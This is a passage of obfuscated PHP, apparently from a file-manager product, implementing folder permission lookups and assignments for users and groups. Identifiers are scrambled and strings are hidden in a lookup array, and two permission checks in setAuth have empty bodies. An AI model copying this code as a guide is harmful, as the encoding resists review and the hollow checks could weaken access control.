$Î‰÷øÚ§ =& $_SERVER[ä¿÷‹µ±]; $¹æ¢£Ó¨ = Model($Î‰÷øÚ§[844])->where(array($Î‰÷øÚ§[468] => $ÍÇÊÆõó))->field($Î‰÷øÚ§[402])->select(); $ÈÜèÑÏ‚ = array_to_keyvalue($¹æ¢£Ó¨, $Î‰÷øÚ§[12], $Î‰÷øÚ§[402]); $¦á™ôöÂ = array($Î‰÷øÚ§[402] => array($Î‰÷øÚ§[7], $ÈÜèÑÏ‚), $Î‰÷øÚ§[494] => 1); $¹æ¢£Ó¨ = $this->where($¦á™ôöÂ)->field($Î‰÷øÚ§[489])->select(); if (empty($¹æ¢£Ó¨)) { return; } $È–î÷»» = array_to_keyvalue($¹æ¢£Ó¨, $Î‰÷øÚ§[12], $Î‰÷øÚ§[489]); $this->remove($È–î÷»»); } private function shareFileMeta($õèæÏı®, $©ôÖ¹  = null) { $¬ò…Ûòû =& $_SERVER[ä¿÷‹µ±]; $¼Ô½¨…¢ = array($¬ò…Ûòû[468] => $õèæÏı®, $¬ò…Ûòû[94] => $¬ò…Ûòû[2025]); if (is_null($©ôÖ¹ )) { return Model($¬ò…Ûòû[2026])->where($¼Ô½¨…¢)->find(); } $¼Ô½¨…¢[$¬ò…Ûòû[374]] = $©ôÖ¹ ; Model($¬ò…Ûòû[2026])->add($¼Ô½¨…¢, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\x72\143\145\x5f\x61\165\164\x68"; public function getAuth($€ÉÔäÃü) { $¯ıØŞ =& $_SERVER[ä¿÷‹µ±]; $ŠÃÉú¢ = $this->sourceAuthSelect($€ÉÔäÃü); $¹¶©çï = array(); $æïŞŠÔ = array(); $†õ½Ğ—Ï = 2 << 25; foreach ($ŠÃÉú¢ as $™æ”äÙÆ) { $üÛËÒ„” = Model($¯ıØŞ[507])->listData($™æ”äÙÆ[$¯ıØŞ[1954]]); if (!$üÛËÒ„”) { continue; } $¹¶©çï[] = $™æ”äÙÆ; $Á¿ ¡ = 0; if ($™æ”äÙÆ[$¯ıØŞ[411]] == SourceModel::TYPE_GROUP) { $Á¿ ¡ = $†õ½Ğ—Ï * 2; } if ($™æ”äÙÆ[$¯ıØŞ[411]] == SourceModel::TYPE_USER) { $Á¿ ¡ = $†õ½Ğ—Ï; } if ($™æ”äÙÆ[$¯ıØŞ[411]] == SourceModel::TYPE_USER && $™æ”äÙÆ[$¯ıØŞ[505]] == $¯ıØŞ[197]) { $Á¿ ¡ = 0; } $æïŞŠÔ[] = $üÛËÒ„”[$¯ıØŞ[413]] + $Á¿ ¡; } array_multisort($æïŞŠÔ, SORT_DESC, $¹¶©çï); return $¹¶©çï; } public function sourceAuthSelect($ë€…œÚ°) { $ÑˆÃ–ÊÍ =& $_SERVER[ä¿÷‹µ±]; static $“ˆÕ¯” = array(); $³ÒŒÄšˆ = is_array($ë€…œÚ°) ? !1 : !0; if ($³ÒŒÄšˆ) { $ë€…œÚ° = array($ë€…œÚ°); } $Ñ²ß¤ß = array(); foreach ($ë€…œÚ° as $¶ğİ°œÔ) { if (isset($“ˆÕ¯”[$¶ğİ°œÔ])) { $Ñ²ß¤ß[$¶ğİ°œÔ] = $“ˆÕ¯”[$¶ğİ°œÔ]; } } if (count($Ñ²ß¤ß) == count($ë€…œÚ°)) { return $³ÒŒÄšˆ ? $Ñ²ß¤ß[$ë€…œÚ°[0]] : $Ñ²ß¤ß; } $ƒıÛêŸë = $ÑˆÃ–ÊÍ[2027]; $—Ø­Íº¿ = array($ÑˆÃ–ÊÍ[402] => array($ÑˆÃ–ÊÍ[7], $ë€…œÚ°)); $˜ø¸Ÿüô = $this->field($ƒıÛêŸë)->order($ÑˆÃ–ÊÍ[399])->where($—Ø­Íº¿)->select(); $›ÔœºŒÃ = array_to_keyvalue_group($˜ø¸Ÿüô, $ÑˆÃ–ÊÍ[402]); foreach ($ë€…œÚ° as $¶ğİ°œÔ) { $“ˆÕ¯”[$¶ğİ°œÔ] = $›ÔœºŒÃ[$¶ğİ°œÔ] ? $›ÔœºŒÃ[$¶ğİ°œÔ] : array(); } if ($³ÒŒÄšˆ) { return $˜ø¸Ÿüô; } return $›ÔœºŒÃ; } public function setAuth($Ä¶µõ“, $Ä“Û÷å¬) { $·ó•¤ûƒ =& $_SERVER[ä¿÷‹µ±]; $ôóÑß¤„ = Model($·ó•¤ûƒ[1349])->sourceInfo($Ä¶µõ“); if (!$ôóÑß¤„) { return !1; } if ($ôóÑß¤„[$·ó•¤ûƒ[411]] != SourceModel::TYPE_GROUP) { return !1; } $·«ƒğŞŞ = 1; $¯ôÆŸªí = $ôóÑß¤„[$·ó•¤ûƒ[505]]; if ($¯ôÆŸªí != $·«ƒğŞŞ) { $©•ˆ»°Ì = array($·ó•¤ûƒ[1850] => $¯ôÆŸªí); $¶•ù«¨º = Model($·ó•¤ûƒ[1940])->field($·ó•¤ûƒ[1678])->where($©•ˆ»°Ì)->select(); $¶•ù«¨º = array_to_keyvalue($¶•ù«¨º, $·ó•¤ûƒ[12], $·ó•¤ûƒ[1678]); } $¹¹ŠÜé = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¦íê¦‚… = array(); foreach ($Ä“Û÷å¬ as $¾Ãçë¦) { if (!in_array($¾Ãçë¦[$·ó•¤ûƒ[411]], $¹¹ŠÜé)) { show_json(LNG($·ó•¤ûƒ[2028]), !1); } if ($¯ôÆŸªí != $·«ƒğŞŞ) { if ($¾Ãçë¦[$·ó•¤ûƒ[411]] == SourceModel::TYPE_GROUP) { } if ($¾Ãçë¦[$·ó•¤ûƒ[505]] != 0 && !in_array($¾Ãçë¦[$·ó•¤ûƒ[505]], $¶•ù«¨º)) { } } if ($¾Ãçë¦[$·ó•¤ûƒ[505]] == 0) { $¾Ãçë¦[$·ó•¤ûƒ[411]] = SourceModel::TYPE_USER; } $¦íê¦‚…[] = array($·ó•¤ûƒ[402] => $Ä¶µõ“, $·ó•¤ûƒ[411] => intval($¾Ãçë¦[$·ó•¤ûƒ[411]]), $·ó•¤ûƒ[505] => intval($¾Ãçë¦[$·ó•¤ûƒ[505]]), $·ó•¤ûƒ[1954] => intval($¾Ãçë¦[$·ó•¤ûƒ[1954]]) ? intval($¾Ãçë¦[$·ó•¤ûƒ[1954]]) : 0, $·ó•¤ûƒ[2010] => intval($¾Ãçë¦[$·ó•¤ûƒ[2010]]) ? intval($¾Ãçë¦[$·ó•¤ûƒ[2010]]) : -1); } $this->where(array($·ó•¤ûƒ[417] => $Ä¶µõ“))->delete(); $this->addAll($¦íê¦‚…); return !0; } public function authClear($ÉÈ«ÜîÀ) { $ˆÉª¦ =& $_SERVER[ä¿÷‹µ±]; $í—Ô™îú = Model($ˆÉª¦[1349])->sourceInfo($ÉÈ«ÜîÀ); $ÂÚŠİÏ— = array($ÉÈ«ÜîÀ); if ($í—Ô™îú[$ˆÉª¦[410]] == $ˆÉª¦[88]) { $ôƒ†‹Ø = array($ˆÉª¦[590] => array($ˆÉª¦[550], $í—Ô™îú[$ˆÉª¦[521]] . $ÉÈ«ÜîÀ . $ˆÉª¦[551])); $ÂÚŠİÏ— = Model($ˆÉª¦[1349])->field($ˆÉª¦[417])->where($ôƒ†‹Ø)->getField($ˆÉª¦[402], !0); $ÂÚŠİÏ—[] = $ÉÈ«ÜîÀ; } $this->where(array($ˆÉª¦[417] => array($ˆÉª¦[418], $ÂÚŠİÏ—)))->delete(); return !0; } public function getAllChildren($ŒùÛ¹—) { $§ü»èˆç =& $_SERVER[ä¿÷‹µ±]; $’ˆà……ù = Model($§ü»èˆç[1349])->sourceInfo($ŒùÛ¹—); if ($’ˆà……ù[$§ü»èˆç[410]] != $§ü»èˆç[88]) { return $this->sourceListAuth(array($ŒùÛ¹—)); } if ($’ˆà……ù[$§ü»èˆç[411]] != SourceModel::TYPE_GROUP) { return array(); } $Ÿ·¶¨şû = 1; $­’ç†´ß = array($ŒùÛ¹—); if ($’ˆà……ù[$§ü»èˆç[432]] == $§ü»èˆç[197] && $’ˆà……ù[$§ü»èˆç[505]] != $Ÿ·¶¨şû) { $­’ç†´ß = $this->groupChidldAllRootSource($’ˆà……ù[$§ü»èˆç[505]]); } $÷«øøß = $this->field($§ü»èˆç[402])->group($§ü»èˆç[402])->select(); $÷«øøß = array_to_keyvalue($÷«øøß, $§ü»èˆç[12], $§ü»èˆç[402]); if (!$÷«øøß) { return array(); } $×Â¢«ŠÒ = $§ü»èˆç[2029]; $à½ÂŞ€æ = array($§ü»èˆç[402] => array($§ü»èˆç[7], $÷«øøß), $§ü»èˆç[431] => $§ü»èˆç[197]); $¡ãÎÔÛ = Model($§ü»èˆç[844])->field($×Â¢«ŠÒ)->where($à½ÂŞ€æ)->select(); $Èä‰¯¤â = array($ŒùÛ¹—); foreach ($¡ãÎÔÛ as $»§Ü °) { foreach ($­’ç†´ß as $Ğ¤¡†¿Î) { $ »‚ÔıÏ = $§ü»èˆç[50] . $Ğ¤¡†¿Î . $§ü»èˆç[50]; $áôÉñª— = $»§Ü °[$§ü»èˆç[521]] . $»§Ü °[$§ü»èˆç[402]] . $§ü»èˆç[50]; if (strstr($áôÉñª—, $ »‚ÔıÏ)) { $Èä‰¯¤â[] = $»§Ü °[$§ü»èˆç[402]]; break; } } } return $this->sourceListAuth($Èä‰¯¤â); } private function sourceListAuth($÷Ã°Â°ª) { $èúĞÄÌ¤ =& $_SERVER[ä¿÷‹µ±]; $¢½€Úñæ = Model($èúĞÄÌ¤[1349])->sourceListInfo($÷Ã°Â°ª, !0); $¨÷ÄëÍµ = $this->sourceAuthSelect($÷Ã°Â°ª); $ÔÓ¼Ô˜Ü = array(); $¼º¬¯†Ì = array(); foreach ($¢½€Úñæ as $æ»¼Õ¾˜) { unset($æ»¼Õ¾˜[$èúĞÄÌ¤[456]]); unset($æ»¼Õ¾˜[$èúĞÄÌ¤[454]]); unset($æ»¼Õ¾˜[$èúĞÄÌ¤[413]]); unset($æ»¼Õ¾˜[$èúĞÄÌ¤[86]]); $÷¾‰¤Ö« = $¨÷ÄëÍµ[$æ»¼Õ¾˜[$èúĞÄÌ¤[402]]]; if (!$÷¾‰¤Ö«) { continue; } $æ»¼Õ¾˜[$èúĞÄÌ¤[2030]] = $this->authTargetInfo($÷¾‰¤Ö«); $æ»¼Õ¾˜[$èúĞÄÌ¤[519]] = rtrim($æ»¼Õ¾˜[$èúĞÄÌ¤[525]], $èúĞÄÌ¤[8]) . $èúĞÄÌ¤[8] . ltrim($æ»¼Õ¾˜[$èúĞÄÌ¤[519]], $èúĞÄÌ¤[8]); $ÔÓ¼Ô˜Ü[] = $æ»¼Õ¾˜; $‘‚éùİ = count(explode($èúĞÄÌ¤[8], trim($æ»¼Õ¾˜[$èúĞÄÌ¤[519]], $èúĞÄÌ¤[8]))); $¼º¬¯†Ì[] = $‘‚éùİ + ($æ»¼Õ¾˜[$èúĞÄÌ¤[33]] == $èúĞÄÌ¤[75] ? 0 : 1000); } array_multisort($¼º¬¯†Ì, SORT_ASC, $ÔÓ¼Ô˜Ü); return $ÔÓ¼Ô˜Ü; } private function groupChidldAllRootSource($äªı×È±) { $ˆ„éãº° =& $_SERVER[ä¿÷‹µ±]; $œ²ãÙ = Model($ˆ„éãº°[2031])->groupChildrenAll($äªı×È±); $†É‰¯ü™ = array($ˆ„éãº°[432] => 0, $ˆ„éãº°[505] => array($ˆ„éãº°[7], $œ²ãÙ), $ˆ„éãº°[411] => SourceModel::TYPE_GROUP); $ª®óŞî× = Model($ˆ„éãº°[844])->field($ˆ„éãº°[402])->where($†É‰¯ü™)->select(); $ª®óŞî× = array_to_keyvalue($ª®óŞî×, $ˆ„éãº°[12], $ˆ„éãº°[402]); return $ª®óŞî×; } private function authTargetInfo($û¿ÌÒÇê) { $ŸÓı½ =& $_SERVER[ä¿÷‹µ±]; $ÄåùÑ„Š = array(); $ø‘£Í„Ù = array(); $úç˜‘³ = 2 << 25; foreach ($û¿ÌÒÇê as $ßáã¤Şâ) { $§Ô¬œÚ¸ = Model($ŸÓı½[507])->listData($ßáã¤Şâ[$ŸÓı½[1954]]); if (!$§Ô¬œÚ¸) { continue; } if ($ßáã¤Şâ[$ŸÓı½[411]] == SourceModel::TYPE_USER) { $ÒÒ¥ÁÀ¨ = Model($ŸÓı½[513])->getInfoSimpleOuter($ßáã¤Şâ[$ŸÓı½[505]]); if ($ÒÒ¥ÁÀ¨[$ŸÓı½[1678]] == $ŸÓı½[1212]) { continue; } if ($ÒÒ¥ÁÀ¨[$ŸÓı½[1678]] == $ŸÓı½[197]) { $ÒÒ¥ÁÀ¨[$ŸÓı½[32]] = LNG($ŸÓı½[2032]); } } else { $ÒÒ¥ÁÀ¨ = Model($ŸÓı½[522])->getInfoSimple($ßáã¤Şâ[$ŸÓı½[505]]); } if (!$ÒÒ¥ÁÀ¨) { continue; } $ÒÒ¥ÁÀ¨[$ŸÓı½[467]] = $§Ô¬œÚ¸; $ÄåùÑ„Š[] = $ÒÒ¥ÁÀ¨; $–‚ÒÃŒ® = 0; if ($ßáã¤Şâ[$ŸÓı½[411]] == SourceModel::TYPE_GROUP) { $–‚ÒÃŒ® = $úç˜‘³ * 2; } if ($ßáã¤Şâ[$ŸÓı½[411]] == SourceModel::TYPE_USER) { $–‚ÒÃŒ® = $úç˜‘³; } if ($ßáã¤Şâ[$ŸÓı½[411]] == SourceModel::TYPE_USER && $ßáã¤Şâ[$ŸÓı½[505]] == $ŸÓı½[197]) { $–‚ÒÃŒ® = 0; } $ø‘£Í„Ù[] = $§Ô¬œÚ¸[$ŸÓı½[413]] + $–‚ÒÃŒ®; } array_multisort($ø‘£Í„Ù, SORT_DESC, $ÄåùÑ„Š); return $ÄåùÑ„Š; } public function getAllChildrenByUser($Å÷Ï‰è, $ÖÔŞáÅ) { $¼•¢°î =& $_SERVER[ä¿÷‹µ±]; $ã˜çÑ = Model($¼•¢°î[535])->getInfo($ÖÔŞáÅ); if (!$ÖÔŞáÅ || !$Å÷Ï‰è || !$ã˜çÑ) { return array(); } $Â“Ùİ‚£ = Model($¼•¢°î[1349])->sourceInfo($Å÷Ï‰è); $†ÒØˆ’ = array(); $¦Ôª£ó˜ = 1; if ($Â“Ùİ‚£[$¼•¢°î[432]] == $¼•¢°î[197] && $Â“Ùİ‚£[$¼•¢°î[505]] != $¦Ôª£ó˜ && $this->groupContainUser($Â“Ùİ‚£[$¼•¢°î[505]], $ÖÔŞáÅ)) { foreach ($ã˜çÑ[$¼•¢°î[2033]] as $’¼Ë§‚£) { $›§¤ÖÌÂ = Model($¼•¢°î[522])->getInfo($’¼Ë§‚£[$¼•¢°î[1850]]); $™Ùßı–ò = Model($¼•¢°î[535])->getInfoSimpleOuter($ÖÔŞáÅ); $™Ùßı–ò[$¼•¢°î[467]] = $’¼Ë§‚£[$¼•¢°î[413]]; if (Model($¼•¢°î[507])->authCheckAction($’¼Ë§‚£[$¼•¢°î[413]][$¼•¢°î[413]], $¼•¢°î[1871])) { continue; } $áÑ²Æà = array($¼•¢°î[32] => $¼•¢°î[1625] . $›§¤ÖÌÂ[$¼•¢°î[32]], $¼•¢°î[402] => $›§¤ÖÌÂ[$¼•¢°î[86]][$¼•¢°î[402]], $¼•¢°î[84] => KodIO::make($›§¤ÖÌÂ[$¼•¢°î[86]][$¼•¢°î[402]]), $¼•¢°î[432] => $¼•¢°î[197], $¼•¢°î[411] => $¼•¢°î[515], $¼•¢°î[33] => $¼•¢°î[554], $¼•¢°î[519] => $›§¤ÖÌÂ[$¼•¢°î[526]], $¼•¢°î[1850] => $›§¤ÖÌÂ[$¼•¢°î[1850]], $¼•¢°î[523] => $›§¤ÖÌÂ[$¼•¢°î[432]], $¼•¢°î[2030] => array($™Ùßı–ò)); $†ÒØˆ’[$áÑ²Æà[$¼•¢°î[402]]] = $áÑ²Æà; } } $ñÙñæ˜ = array(); $Ñ‚¶ä¶ = $this->getAllChildren($Å÷Ï‰è); foreach ($Ñ‚¶ä¶ as $Šì÷Û £) { $ëìÒ™ = !1; foreach ($Šì÷Û £[$¼•¢°î[2030]] as $¹ßü×¹) { if ($¹ßü×¹[$¼•¢°î[1678]]) { if ($¹ßü×¹[$¼•¢°î[1678]] == $ÖÔŞáÅ) { $ëìÒ™ = !0; break; } } if ($¹ßü×¹[$¼•¢°î[1850]]) { if ($this->groupContainUser($¹ßü×¹[$¼•¢°î[1850]], $ÖÔŞáÅ)) { $ëìÒ™ = !0; break; } } } if ($ëìÒ™) { $ñÙñæ˜[] = $Šì÷Û £; } $·ŠØÑºó = $Šì÷Û £[$¼•¢°î[402]]; if (isset($†ÒØˆ’[$·ŠØÑºó])) { $Šì÷Û £[$¼•¢°î[2030]][] = $†ÒØˆ’[$·ŠØÑºó][0]; $†ÒØˆ’[$·ŠØÑºó] = !1; } } $†ÒØˆ’ = array_filter(array_values($†ÒØˆ’)); $ñÙñæ˜ = array_merge($†ÒØˆ’, $ñÙñæ˜); return $ñÙñæ˜; } public function setAllChildrenByUser($ĞÓ˜£ŠÛ, $ş‚©õšÙ, $§Ü¤©ã÷) { $É”‹½ü˜ =& $_SERVER[ä¿÷‹µ±]; $ÜÌ¿Ï”˜ = $this->getAllChildrenByUser($ĞÓ˜£ŠÛ, $ş‚©õšÙ); if (!$§Ü¤©ã÷ || !$ÜÌ¿Ï”˜) { return !1; } foreach ($ÜÌ¿Ï”˜ as $Òöî¾Ïì) { $Á³¯ÂŸû = array(); foreach ($Òöî¾Ïì[$É”‹½ü˜[2030]] as $íö÷™’ù) { $·¦¿¯Õ = $íö÷™’ù[$É”‹½ü˜[467]]; $Í¼Ú¤Ÿ§ = $íö÷™’ù[$É”‹½ü˜[1678]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $éè‡úìí = $íö÷™’ù[$É”‹½ü˜[1678]] ? $íö÷™’ù[$É”‹½ü˜[1678]] : $íö÷™’ù[$É”‹½ü˜[1850]]; if ($íö÷™’ù[$É”‹½ü˜[1678]] && $íö÷™’ù[$É”‹½ü˜[1678]] == $ş‚©õšÙ) { continue; } $Á³¯ÂŸû[] = array($É”‹½ü˜[402] => $Òöî¾Ïì[$É”‹½ü˜[402]], $É”‹½ü˜[411] => $Í¼Ú¤Ÿ§, $É”‹½ü˜[505] => intval($éè‡úìí), $É”‹½ü˜[1954] => isset($·¦¿¯Õ[$É”‹½ü˜[399]]) ? intval($·¦¿¯Õ[$É”‹½ü˜[399]]) : 0, $É”‹½ü˜[2010] => isset($·¦¿¯Õ[$É”‹½ü˜[2010]]) ? intval($·¦¿¯Õ[$É”‹½ü˜[2010]]) : -1); } $Á³¯ÂŸû[] = array($É”‹½ü˜[402] => $Òöî¾Ïì[$É”‹½ü˜[402]], $É”‹½ü˜[411] => SourceModel::TYPE_USER, $É”‹½ü˜[505] => intval($ş‚©õšÙ), $É”‹½ü˜[1954] => intval($§Ü¤©ã÷), $É”‹½ü˜[2010] => -1); $this->where(array($É”‹½ü˜[417] => $Òöî¾Ïì[$É”‹½ü˜[402]]))->delete(); $this->addAll($Á³¯ÂŸû); } return !0; } public function get($ìöÓıè¸) { $€ŸıÌ©â = $this->getSourceList(array($ìöÓıè¸), !0); return $€ŸıÌ©â[0]; } public function getSourceList($ø¦„ç­û, $¶ùŒÖ = false, $¿¹ÏÌµå = false) { $†Ş“ù =& $_SERVER[ä¿÷‹µ±]; if (!$ø¦„ç­û) { return array(); } $ÊÎÖ ÃÏ = Model($†Ş“ù[1349]); if (!$¶ùŒÖ && count($ø¦„ç­û) == 1) { $¶ùŒÖ = array(); $¶ùŒÖ[$ø¦„ç­û[0]] = $ÊÎÖ ÃÏ->sourceInfo($ø¦„ç­û[0]); } if (!$¶ùŒÖ) { $Ó˜åí„¦ = array($†Ş“ù[417] => array($†Ş“ù[418], $ø¦„ç­û)); $¶ùŒÖ = $ÊÎÖ ÃÏ->field($†Ş“ù[2034])->where($Ó˜åí„¦)->select(); $¶ùŒÖ = array_to_keyvalue($¶ùŒÖ, $†Ş“ù[402]); } $½ÕÆ á = $ø¦„ç­û; foreach ($¶ùŒÖ as $ä‹ƒ‘’Í => $î›âœüÙ) { $’ìÂ´Ğò = $ÊÎÖ ÃÏ->parentLevelArray($î›âœüÙ[$†Ş“ù[521]]); $½ÕÆ á = array_merge($½ÕÆ á, array($ä‹ƒ‘’Í), array_reverse($’ìÂ´Ğò)); } $½ÕÆ á = array_values(array_unique($½ÕÆ á)); if (!$½ÕÆ á) { return array(); } $‹Ú£ÓÜƒ = $this->sourceAuthSelect($½ÕÆ á); $Æè´¿»ª = array(); foreach ($½ÕÆ á as $ÓôÒñ×¥) { if (isset($‹Ú£ÓÜƒ[$ÓôÒñ×¥])) { $Æè´¿»ª[$ÓôÒñ×¥] = $‹Ú£ÓÜƒ[$ÓôÒñ×¥]; } } $ğ½›‹¥Ë = $this->userIsRoot($¿¹ÏÌµå); $„ùÁÊ€Û = AuthModel::authAll(); $’“ºÍÜ¨ = array($†Ş“ù[414] => $„ùÁÊ€Û, $†Ş“ù[2035] => array($†Ş“ù[419] => 0, $†Ş“ù[1856] => $„ùÁÊ€Û, $†Ş“ù[420] => LNG($†Ş“ù[2036]), $†Ş“ù[1873] => $†Ş“ù[2037])); $êÊ¬”û¬ = array(); foreach ($¶ùŒÖ as $ÓôÒñ×¥ => $¼‰æìÄ) { if ($ğ½›‹¥Ë && $GLOBALS[$†Ş“ù[6]][$†Ş“ù[1869]]) { $êÊ¬”û¬[$ÓôÒñ×¥] = $’“ºÍÜ¨; continue; } $êÊ¬”û¬[$ÓôÒñ×¥] = $this->makeSourceAuth($¼‰æìÄ, $Æè´¿»ª, $¿¹ÏÌµå); } return $êÊ¬”û¬; } public function authDeepCheck($ĞœÑ°â†, $­„ñİÂ = false) { $ÊÒı½Î =& $_SERVER[ä¿÷‹µ±]; $­„ñİÂ = $­„ñİÂ ? $­„ñİÂ : USER_ID; $®ªÀã×¹ = $this->makeAuthDeep($­„ñİÂ); if (!in_array($ĞœÑ°â†, $®ªÀã×¹[$ÊÒı½Î[2038]])) { return !1; } $Ñ£÷Èİ† = array(); foreach ($®ªÀã×¹[$ÊÒı½Î[2039]] as $½‹»½Ÿ => $âÏµÀ¡—) { if (!in_array($ĞœÑ°â†, $âÏµÀ¡—)) { continue; } $Ñ£÷Èİ†[] = $½‹»½Ÿ; } if (!$Ñ£÷Èİ†) { return !1; } $»Á ×Á = $Ñ£÷Èİ† ? $Ñ£÷Èİ†[0] : $ĞœÑ°â†; return array($ÊÒı½Î[414] => -1, $ÊÒı½Î[467] => array($ÊÒı½Î[419] => $ÊÒı½Î[1212], $ÊÒı½Î[1856] => $ÊÒı½Î[197], $ÊÒı½Î[420] => LNG($ÊÒı½Î[2040]), $ÊÒı½Î[1873] => $ÊÒı½Î[2041]), $ÊÒı½Î[2042] => LNG($ÊÒı½Î[2043]), $ÊÒı½Î[2044] => $this->sourceAuthInfo($»Á ×Á)); } protected function makeAuthDeep($ºñÇÆ° = false) { $íÍÓ½½Û =& $_SERVER[ä¿÷‹µ±]; static $¹ö¥èÚí = array(); $ºñÇÆ° = $ºñÇÆ° ? $ºñÇÆ° : USER_ID; if (isset($¹ö¥èÚí[$ºñÇÆ°])) { return $¹ö¥èÚí[$ºñÇÆ°]; } $«‰äÛ˜‘ = Model($íÍÓ½½Û[2045])->listData(); $‚Ñ¡¢Ù = array(); foreach ($«‰äÛ˜‘ as $¦ÏÅÚ°) { if ($¦ÏÅÚ°[$íÍÓ½½Û[413]] == 0 && $¦ÏÅÚ°[$íÍÓ½½Û[1872]] == $íÍÓ½½Û[88]) { $‚Ñ¡¢Ù[] = $¦ÏÅÚ°[$íÍÓ½½Û[399]]; } } $èåÏíşˆ = $this->userGroupParents($ºñÇÆ°); $Ù“äšÂ÷ = array($íÍÓ½½Û[411] => SourceModel::TYPE_USER, $íÍÓ½½Û[505] => $ºñÇÆ°); if ($èåÏíşˆ) { $Ù“äšÂ÷ = array(array($íÍÓ½½Û[411] => SourceModel::TYPE_USER, $íÍÓ½½Û[505] => $ºñÇÆ°), array($íÍÓ½½Û[411] => SourceModel::TYPE_GROUP, $íÍÓ½½Û[505] => array($íÍÓ½½Û[418], $èåÏíşˆ)), $íÍÓ½½Û[1022] => $íÍÓ½½Û[1948]); } $†âÎñòó = $this->field($íÍÓ½½Û[2046])->where($Ù“äšÂ÷)->select(); $ôÉœ” = array(); $Ûşé­ï¦ = array_to_keyvalue_group($†âÎñòó, $íÍÓ½½Û[402]); foreach ($Ûşé­ï¦ as $üöÊä => $ïà–·Ë±) { $ú¯íïı¹ = $this->authArrayCheck($ïà–·Ë±, $ºñÇÆ°); if ($ú¯íïı¹[$íÍÓ½½Û[414]] > 0) { $ôÉœ”[] = $üöÊä . $íÍÓ½½Û[12]; } } if ($èåÏíşˆ) { $ì™ÎŞŸ¬ = Model($íÍÓ½½Û[522]); foreach ($èåÏíşˆ as $’èÏö˜¾) { $µÁ…ò¨· = $ì™ÎŞŸ¬->getInfo($’èÏö˜¾); if (!$µÁ…ò¨· || !is_array($µÁ…ò¨·[$íÍÓ½½Û[86]])) { continue; } $ôÉœ”[] = $µÁ…ò¨·[$íÍÓ½½Û[86]][$íÍÓ½½Û[402]]; } } $Ùï»•Òã = array(); $«è¨é¿â = $èåÏíşˆ; $—ÙÜîª€ = Model($íÍÓ½½Û[1349]); $ì™ÎŞŸ¬ = Model($íÍÓ½½Û[522]); $¸š²÷Âİ = array(); $è›°ô¹™ = array(); $†¶½˜¬Ê = array(); $–ğ‘üª‰ = array(); if ($ôÉœ”) { $ÚöÉÓîµ = $—ÙÜîª€->where(array($íÍÓ½½Û[402] => array($íÍÓ½½Û[418], $ôÉœ”)))->select(); foreach ($ÚöÉÓîµ as $üÓĞ¨ò) { $†¼¨ìô = $—ÙÜîª€->parentLevelArray($üÓĞ¨ò[$íÍÓ½½Û[521]]); $Ùï»•Òã = array_merge($Ùï»•Òã, $†¼¨ìô); $«è¨é¿â[] = $üÓĞ¨ò[$íÍÓ½½Û[505]]; $¸š²÷Âİ[$üÓĞ¨ò[$íÍÓ½½Û[402]]] = $†¼¨ìô; $è›°ô¹™[$üÓĞ¨ò[$íÍÓ½½Û[402]]] = $üÓĞ¨ò[$íÍÓ½½Û[505]]; } } $«è¨é¿â = array_values(array_unique($«è¨é¿â)); $ş×Æİ²× = $«è¨é¿â; foreach ($ş×Æİ²× as $’èÏö˜¾) { $µÁ…ò¨· = $ì™ÎŞŸ¬->getInfo($’èÏö˜¾); $†¼¨ìô = $—ÙÜîª€->parentLevelArray($µÁ…ò¨·[$íÍÓ½½Û[521]]); $«è¨é¿â = array_merge($«è¨é¿â, $†¼¨ìô); } $«è¨é¿â = array_values(array_unique($«è¨é¿â)); foreach ($«è¨é¿â as $’èÏö˜¾) { $µÁ…ò¨· = $ì™ÎŞŸ¬->getInfo($’èÏö˜¾); $Ùï»•Òã[] = $µÁ…ò¨·[$íÍÓ½½Û[86]][$íÍÓ½½Û[402]]; $†¶½˜¬Ê[$’èÏö˜¾] = $µÁ…ò¨·[$íÍÓ½½Û[86]][$íÍÓ½½Û[402]]; $–ğ‘üª‰[$’èÏö˜¾] = $—ÙÜîª€->parentLevelArray($µÁ…ò¨·[$íÍÓ½½Û[521]]); } foreach ($¸š²÷Âİ as $¬‚øŸ¹ => $×ñÃÇÅ) { $ş˜œÖ‡Î = $è›°ô¹™[$¬‚øŸ¹]; if (!$ş˜œÖ‡Î || !$†¶½˜¬Ê[$ş˜œÖ‡Î]) { continue; } $±òÌë™‘ = array(); foreach ($–ğ‘üª‰[$ş˜œÖ‡Î] as $’èÏö˜¾) { $±òÌë™‘[] = $†¶½˜¬Ê[$’èÏö˜¾]; } $¸š²÷Âİ[$¬‚øŸ¹] = array_merge($±òÌë™‘, $×ñÃÇÅ); } $Ùï»•Òã = array_values(array_unique($Ùï»•Òã)); $ ¤²­Õı = array($íÍÓ½½Û[2038] => $Ùï»•Òã, $íÍÓ½½Û[2039] => $¸š²÷Âİ); $¹ö¥èÚí[$ºñÇÆ°] = $ ¤²­Õı; return $ ¤²­Õı; } private function makeSourceAuth($İœ™¿Íê, $ÆÁÉ¸šŠ, $£İôïãà = false) { $ìıâÓ•œ =& $_SERVER[ä¿÷‹µ±]; $€®Ê¥Åì = $ìıâÓ•œ[88]; $¯æçœïÃ = $İœ™¿Íê[$ìıâÓ•œ[505]]; $‰€–Ëõ“ = $İœ™¿Íê[$ìıâÓ•œ[411]] == SourceModel::TYPE_GROUP; $õë¹ùª„ = $‰€–Ëõ“ ? $this->groupRootAuth($¯æçœïÃ, $£İôïãà) : !1; if ($õë¹ùª„ && Model($ìıâÓ•œ[507])->authCheckAction($õë¹ùª„[$ìıâÓ•œ[413]], $ìıâÓ•œ[1871])) { return $this->groupAuthInfo($õë¹ùª„, $¯æçœïÃ); } $±³Ç¶óª = Model($ìıâÓ•œ[1349])->parentLevelArray($İœ™¿Íê[$ìıâÓ•œ[521]]); $±³Ç¶óª = array_merge(array($İœ™¿Íê[$ìıâÓ•œ[402]]), array_reverse($±³Ç¶óª)); $üß¹ã†Œ = !1; foreach ($±³Ç¶óª as $€Õû¶½ü) { if (!isset($ÆÁÉ¸šŠ[$€Õû¶½ü])) { continue; } $±ıØåŠÑ = $this->authMake($ÆÁÉ¸šŠ[$€Õû¶½ü], $£İôïãà); if ($±ıØåŠÑ[$ìıâÓ•œ[467]]) { $üß¹ã†Œ = $±ıØåŠÑ; break; } } if (!$‰€–Ëõ“) { return $üß¹ã†Œ; } if (!$üß¹ã†Œ && $õë¹ùª„) { $üß¹ã†Œ = $this->groupAuthInfo($õë¹ùª„, $¯æçœïÃ); } if (!$üß¹ã†Œ) { $„Ø½‰û× = 